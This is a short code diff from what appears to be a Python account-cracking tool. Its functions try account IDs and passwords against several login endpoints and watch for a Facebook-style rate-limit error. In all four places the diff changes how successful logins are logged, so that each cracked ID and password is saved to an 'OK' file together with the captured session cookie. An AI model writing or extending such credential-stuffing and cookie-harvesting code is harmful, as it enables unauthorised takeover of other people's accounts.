@@ -1734,7 +1734,7 @@ def fankygraphv1(idf, pwv, url):
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                 break
 
             elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
@@ -1824,7 +1824,7 @@ def fankywww(idf, pwv):
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                 break
             else:
                 continue
@@ -1904,7 +1904,7 @@ def fanky_b_api(idf, pwv):
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                 break
             else:
                 continue
@@ -1950,7 +1950,7 @@ def fankytouch(idf,pwv):
 				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
 				prints(tree)
-				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
 				break
 			else:
 				continue
